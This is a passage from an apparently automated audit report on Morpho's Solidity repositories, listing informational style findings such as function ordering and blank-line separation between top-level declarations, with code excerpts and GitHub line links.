51:     using MarketParamsLib for MarketParams;

52:     using PendingLib for MarketConfig;

53:     using PendingLib for PendingUint192;

54:     using PendingLib for PendingAddress;

118:     constructor(

176:     modifier afterTimelock(uint256 validAt) {

```

[44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L44), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L45), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L46), [47](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L47), [48](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L48), [49](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L49), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L50), [51](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L51), [52](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L52), [53](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L53), [54](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L54), [118](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L118), [176](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L176)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

19:     using SafeTransferLib for ERC20;

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L19)

```solidity
File: morpho-blue-bundlers/src/ERC4626Bundler.sol

17:     using SafeTransferLib for ERC20;

```

[17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L17)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

17:     using SafeTransferLib for ERC20;

```

[17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L17)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

19:     using SafeCast160 for uint256;

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L19)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

18:     using SafeTransferLib for ERC20;

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L18)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

16:     using SafeTransferLib for ERC20;

```

[16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L16)

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

18:     using SafeTransferLib for ERC20;

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

18:     using SafeTransferLib for ERC20;

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

19:     error BadSignatory();

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L19)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

19:     using MathLib for int256;

20:     using UtilsLib for int256;

21:     using MorphoMathLib for uint128;

22:     using MorphoMathLib for uint256;

23:     using MarketParamsLib for MarketParams;

28:     event BorrowRateUpdate(Id indexed id, uint256 avgBorrowRate, uint256 rateAtTarget);

57:     mapping(Id => int256) public rateAtTarget;

```

[19](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L19), [20](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L20), [21](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L21), [22](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L22), [23](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L23), [28](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L28), [57](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L57)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

16:     using Math for uint256;

17:     using VaultLib for IERC4626;

18:     using ChainlinkDataFeedLib for AggregatorV3Interface;

```

[16](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L16), [17](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L17), [18](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L18)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

19:     using SafeTransferLib for ERC20;

```

[19](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L19)




### Function ordering does not follow the Solidity style guide	_(duplicate of [Function ordering does not follow the Solidity style guide])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

According to the Solidity style guide, functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern

*Instances (2)*:


```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit  multicall(external) came after
42:     function initiator() public view returns (address) {

/// @audit  initiator(public) came earlier
51:     function multicall(bytes[] memory data) external payable {

```

[42](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L42), [51](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L51)




### Top level declarations should be separated by two blank lines

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (93)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

2: pragma solidity 0.8.20;
3:   
4:   import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";

8: import {ERC20Wrapper} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
9:   
10:   /// @title ERC20PermissionedBase

```

[2-4](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L2-L4), [8-10](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L8-L10)

```solidity
File: metamorpho/src/MetaMorpho.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IMorphoMarketParams} from "./interfaces/IMorphoMarketParams.sol";

37: } from "../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";
38:    
39:    /// @title MetaMorpho

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L2-L4), [37-39](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L37-L39)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

2: pragma solidity 0.8.21;
3:   
4:   import {EventsLib} from "./libraries/EventsLib.sol";

7: import {MetaMorpho} from "./MetaMorpho.sol";
8:   
9:   /// @title MetaMorphoFactory

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L2-L4), [7-9](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L7-L9)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

2: pragma solidity >=0.5.0;
3:   
4:   import {IMorpho, Id, MarketParams} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";

8: import {MarketConfig, PendingUint192, PendingAddress} from "../libraries/PendingLib.sol";
9:   
10:   /// @dev Either `assets` or `shares` should be zero.

20: }
21:    
22:    interface IOwnable {

28: }
29:    
30:    /// @dev This interface is used for factorizing IMetaMorphoStaticTyping and IMetaMorpho.

76: }
77:    
78:    /// @dev This interface is inherited by MetaMorpho so that function signatures are checked by the compiler.

85: }
86:    
87:    /// @title IMetaMorpho

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L2-L4), [8-10](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L8-L10), [20-22](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L20-L22), [28-30](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L28-L30), [76-78](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L76-L78), [85-87](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L85-L87)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

2: pragma solidity >=0.5.0;
3:   
4:   import {MarketParams, Id} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";

4: import {MarketParams, Id} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";
5:   
6:   interface IMorphoMarketParams {

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L2-L4), [4-6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L4-L6)

```solidity
File: metamorpho/src/libraries/ConstantsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title ConstantsLib

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L2-L4)

```solidity
File: metamorpho/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   import {Id} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";

4: import {Id} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";
5:   
6:   /// @title ErrorsLib

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L2-L4), [4-6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L4-L6)

```solidity
File: metamorpho/src/libraries/EventsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   import {Id} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";

6: import {PendingAddress} from "./PendingLib.sol";
7:   
8:   /// @title EventsLib

```

[2-4](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L2-L4), [6-8](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L6-L8)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IMulticall} from "./interfaces/IMulticall.sol";

8: import {SafeTransferLib, ERC20} from "../lib/solmate/src/utils/SafeTransferLib.sol";
9:   
10:   /// @title BaseBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L2-L4), [8-10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L8-L10)

```solidity
File: morpho-blue-bundlers/src/ERC4626Bundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IERC4626} from "../lib/openzeppelin-contracts/contracts/interfaces/IERC4626.sol";

10: import {BaseBundler} from "./BaseBundler.sol";
11:    
12:    /// @title ERC4626Bundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L2-L4), [10-12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L10-L12)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IMorphoBundler} from "./interfaces/IMorphoBundler.sol";

10: import {BaseBundler} from "./BaseBundler.sol";
11:    
12:    /// @title MorphoBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L2-L4), [10-12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L10-L12)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IAllowanceTransfer} from "../lib/permit2/src/interfaces/IAllowanceTransfer.sol";

12: import {BaseBundler} from "./BaseBundler.sol";
13:    
14:    /// @title Permit2Bundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L2-L4), [12-14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L12-L14)

```solidity
File: morpho-blue-bundlers/src/PermitBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IERC20Permit} from "../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Permit.sol";

6: import {BaseBundler} from "./BaseBundler.sol";
7:   
8:   /// @title PermitBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L2-L4), [6-8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L6-L8)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IWstEth} from "./interfaces/IWstEth.sol";

11: import {BaseBundler} from "./BaseBundler.sol";
12:    
13:    /// @title StEthBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L2-L4), [11-13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L11-L13)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {Math} from "../lib/morpho-utils/src/math/Math.sol";

8: import {BaseBundler} from "./BaseBundler.sol";
9:   
10:   /// @title TransferBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L2-L4), [8-10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L8-L10)

```solidity
File: morpho-blue-bundlers/src/UrdBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IUniversalRewardsDistributor} from

9: import {BaseBundler} from "./BaseBundler.sol";
10:   
11:   /// @title UrdBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L2-L4), [9-11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L9-L11)

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IWNative} from "./interfaces/IWNative.sol";

10: import {BaseBundler} from "./BaseBundler.sol";
11:    
12:    /// @title WNativeBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L2-L4), [10-12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L10-L12)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {MainnetLib} from "./libraries/MainnetLib.sol";

15: import {ERC20WrapperBundler} from "../ERC20WrapperBundler.sol";
16:    
17:    /// @title EthereumBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L2-L4), [15-17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L15-L17)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IDaiPermit} from "./interfaces/IDaiPermit.sol";

8: import {PermitBundler} from "../PermitBundler.sol";
9:   
10:   /// @title EthereumPermitBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L2-L4), [8-10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L8-L10)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumStEthBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {MainnetLib} from "./libraries/MainnetLib.sol";

6: import {StEthBundler} from "../StEthBundler.sol";
7:   
8:   /// @title EthereumStEthBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L2-L4), [6-8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L6-L8)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface IDaiPermit {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   library MainnetLib {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMorphoBundler.sol

2: pragma solidity >=0.5.0;
3:   
4:   import {

9: } from "../../lib/morpho-blue/src/interfaces/IMorphoCallbacks.sol";
10:   
11:   /// @title IMorphoBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L2-L4), [9-11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L9-L11)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

2: pragma solidity >=0.5.0;
3:   
4:   /// @title IMulticall

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface IStEth {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface IWNative {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface IWstEth {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/libraries/ConstantsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @dev The default value of the initiator of the multicall transaction is not the address zero to save gas.

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ConstantsLib.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title ErrorsLib

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ErrorsLib.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IAaveV2} from "./interfaces/IAaveV2.sol";

11: import {MigrationBundler, ERC20} from "./MigrationBundler.sol";
12:    
13:    /// @title AaveV2MigrationBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L2-L4), [11-13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L11-L13)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IAaveV3} from "./interfaces/IAaveV3.sol";

9: import {MigrationBundler, ERC20} from "./MigrationBundler.sol";
10:   
11:   /// @title AaveV3MigrationBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L2-L4), [9-11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L9-L11)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {ICEth} from "./interfaces/ICEth.sol";

12: import {MigrationBundler, ERC20} from "./MigrationBundler.sol";
13:    
14:    /// @title CompoundV2MigrationBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L2-L4), [12-14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L12-L14)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {ICompoundV3} from "./interfaces/ICompoundV3.sol";

9: import {MigrationBundler, ERC20} from "./MigrationBundler.sol";
10:   
11:   /// @title CompoundV3MigrationBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L2-L4), [9-11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L9-L11)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

2: pragma solidity 0.8.21;
3:   
4:   import {SafeTransferLib, ERC20} from "../../lib/solmate/src/utils/SafeTransferLib.sol";

11: import {MorphoBundler} from "../MorphoBundler.sol";
12:    
13:    /// @title MigrationBundler

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L2-L4), [11-13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L11-L13)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

2: pragma solidity >=0.5.0;
3:   
4:   struct ReserveConfigurationMap {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

2: pragma solidity >=0.5.0;
3:   
4:   struct ReserveConfigurationMap {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface ICEth {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface ICToken {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

2: pragma solidity >=0.5.0;
3:   
4:   bytes32 constant DOMAIN_TYPEHASH =

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L2-L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

2: pragma solidity >=0.5.0;
3:   
4:   interface IComptroller {

```

[2-4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L2-L4)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

2: pragma solidity 0.8.19;
3:   
4:   import {IIrm} from "../lib/morpho-blue/src/interfaces/IIrm.sol";

13: import {MathLib as MorphoMathLib} from "../lib/morpho-blue/src/libraries/MathLib.sol";
14:    
15:    /// @title AdaptiveCurveIrm

```

[2-4](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L2-L4), [13-15](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L13-L15)

```solidity
File: morpho-blue-irm/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title ErrorsLib

```

[2-4](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/ErrorsLib.sol#L2-L4)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   import {WAD} from "../../lib/morpho-blue/src/libraries/MathLib.sol";

4: import {WAD} from "../../lib/morpho-blue/src/libraries/MathLib.sol";
5:   
6:   int256 constant WAD_INT = int256(WAD);

```

[2-4](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L2-L4), [4-6](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L4-L6)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title UtilsLib

```

